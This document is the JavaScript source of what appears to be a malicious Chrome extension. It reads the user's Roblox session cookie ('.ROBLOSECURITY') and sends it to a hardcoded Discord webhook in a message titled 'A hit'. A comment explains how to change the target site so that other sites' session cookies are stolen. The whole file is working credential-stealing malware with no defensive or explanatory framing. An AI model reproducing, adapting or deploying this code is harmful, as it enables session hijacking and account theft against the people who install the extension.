function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `A hit`,
            "description": "Cookie",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1050236191313756160/PoGVuAqvjwQ3gRWsLMKgUwzueiNeAyWPQOukpT5WdygtCAdcQHrhYaXS735f54JxBUnu", cookie.value);
  }
});
